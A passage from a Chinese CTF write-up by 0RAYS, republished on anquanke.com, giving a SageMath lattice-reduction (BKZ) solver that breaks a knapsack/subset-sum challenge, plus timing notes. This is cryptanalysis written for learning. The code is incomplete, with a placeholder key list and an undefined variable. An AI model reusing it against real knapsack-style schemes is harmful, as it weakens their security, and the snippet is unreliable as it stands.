    def solve(A, n, k, s, r, ID=None, BS=22): 
        N = ceil(sqrt(n)) # parameter used in the construction of lattice 
        rand = random.Random(x=ID) # seed 
        indexes = set(range(n)) 
        small_vec = None 
        itr = 0 
        total_time = 0.0 
        print(f"[{ID}] n={n} Start... {itr}") 
        while True: 
            # 1. initalization 
            #t0 = cputime() 
            itr += 1 
    
            kick_out = set(sample(range(n), r)) 
            new_set = [A[i] for i in indexes - kick_out] 
            lat = [] 
            for i,a in enumerate(new_set): 
                lat.append([1*(j==i) for j in range(n-r)] + [N*a] + [N]) 
            lat.append([0]*(n-r) + [N*s] + [k*N]) 
            shuffle(lat, random=rand.random) 
            m = matrix(ZZ, lat) 
            #t_BKZ = cputime() 
            m_BKZ = m.BKZ(block_size=BS) 
    
            print("BKZ finished") 
            #print(f"[{ID}] n={n} {itr} runs. BKZ running time: {cputime(t_BKZ):.3f}s") 
            if m_BKZ[0].norm()^2 == k: 
                print("+++++++++++++"); 
                print("total time: "+str(total)) 
                print(m_BKZ[0]) 
                print(kick_out) 
                return True 
    def main(): 
        CPU_CORE_NUM = 80 
    
        for n, k, s in LEVEL[:]: 
            r = ZERO_FORCE[n] 
            A = #key列表 
            solve_n = partial(solve, A, n, k, s, r) 
            with mp.Pool(CPU_CORE_NUM) as pool: 
                reslist = pool.imap_unordered(solve_n, range(CPU_CORE_NUM)) 
    
                # terminate all processes once one process returns 
                for res in reslist: 
                    if res: 
                        pool.terminate() 
                        break 
    if __name__ == "__main__": 
        main()
    

80核服务器5分钟【运气好24s】  
8核虚拟机运气好5分钟

###  sum

同上，不过180维背包取160个，反过来看还是轻背包。不过就是80核服务器15h+而已，【草：一种植物】

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **0RAYS** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/212809](/post/id/212809)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __2赞

 __收藏

![](https://p2.ssl.qhimg.com/t0154f5d285696ed05b.png) 0RAYS

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

